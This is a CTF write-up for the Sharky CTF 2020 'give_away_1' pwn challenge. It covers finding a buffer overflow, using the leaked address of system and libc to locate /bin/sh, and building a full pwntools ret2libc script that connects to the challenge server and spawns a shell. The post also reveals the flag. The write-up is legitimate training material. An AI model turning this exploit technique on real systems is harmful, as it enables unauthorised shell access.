---
title: "Sharky CTF 2020: give_away_1 (Pwn)"
layout: post
date: 2020-05-12
tags:
- CTF
- writeup
- Sharky CTF 2020
- Pwn
comments: true
---

> Make good use of this gracious give away.
>
> Creator: Hackhim
>
> [give\_away\_1](/files/give_away_1)
>
> [libc-2.27.so](/files/libc-2.27.so)

As with most pwn challenges, let's start off by checking what kind of binary we're given.

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_one$ file give_away_1

give_away_1: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=2b72e93281e97df94bf8362d5cf5a29f55accb8a, not stripped
```

Okay, it's just a 32 bit ELF binary. Let's run it to get a better idea of what it does.

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_one$ ./give_away_1
Give away: 0xf7dbad10

```

Seems like it just prints a hex value and gets some input from us. Great. Now let's see how well it handles a large input.

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_one$ python -c 'print "A"*1024' | ./give_away_1
Give away: 0xf7e18d10
Segmentation fault (core dumped)
```

Oh a [segmentation fault](https://en.wikipedia.org/wiki/Segmentation_fault), looks like we potentially have a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) vulnerability here. Let's open up the binary in IDA and see what further insights we can gather. Currently, we still don't know what that hex value is.

```
mov     eax, ds:(system_ptr - 1FBCh)[ebx]
push    eax
lea     eax, (aGiveAwayP - 1FBCh)[ebx] ; "Give away: %p\n"
push    eax             ; format
call    _printf ; printf("Give away: %p\n", system_ptr);
```

Oh wow is the hex value given to us an actual a reference to the `system`?

```
.got:00001FDC system_ptr      dd offset system ; DATA XREF: main+22↑r
```

Awesome, looks like we can combine this with the buffer overflow vulnerability and call `system("/bin/sh")` to get a shell. Where are we going to get the `/bin/sh` string from? We still haven't made use of the `libc-2.27.so` right?

```
vagrant@ctf:/vagrant/challenges/sharky/give_away_one$ grep -obUaP "/bin/sh\x00" libc-2.27.so
1564879:/bin/sh
```

Bingo! So all we have to do is to calculate the address to `/bin/sh` and use that as a parameter for our call to `system`.

Consolidating all the information we have to far, we can conclude that the payload should probably look something like this:

```
<padding of ? bytes><address(system)><padding of 4 bytes><address("/bin/sh\x00")>
```

The only information we're lacking is the length of the padding. We can easily do this with the `cyclic` utility included with [pwndbg](https://github.com/pwndbg/pwndbg).

<script id="asciicast-wH3QaSI2bviasewd7uSz4E0Hd" src="https://asciinema.org/a/wH3QaSI2bviasewd7uSz4E0Hd.js" async></script>

> TL;DR: Padding is 36

Okay, great. Now all we need to do is to write script to solve this.

```python
#! /usr/bin/python2

from pwn import *

HOST = 'sharkyctf.xyz'
PORT = 20334
BINARY = './give_away_1'

elf = context.binary = ELF(BINARY)
libc = ELF('libc-2.27.so')

# Start connection

r = remote(HOST, PORT)

# Stage 1: Get system@libc

libc_system = int(r.recvline().split()[2][2:], 16)
log.info('Leaked libc_system: 0x{:x}'.format(libc_system))

# Stage 2: Build ROP Chain

libc.address = libc_system - libc.symbols.system
log.info('Calculated libc base address : 0x{:x}'.format(libc.address))

binsh = libc.search("/bin/sh\x00").next()
log.info('binsh: 0x{:x}'.format(binsh))

rop = ROP([libc, elf])
rop.system(binsh)

log.success('Generated ROP Chain')
log.success(rop.dump())

# Stage 3: Pwn

r.sendline(fit({ 36: rop.chain() }))

log.success('Sent payload')
log.progress('Spawning a shell...')

r.interactive()
```

Let's see it in action!

<script id="asciicast-329253" src="https://asciinema.org/a/329253.js" async></script>

Flag: `shkCTF{I_h0PE_U_Fl4g3d_tHat_1n_L3ss_Th4n_4_m1nuT3s}`
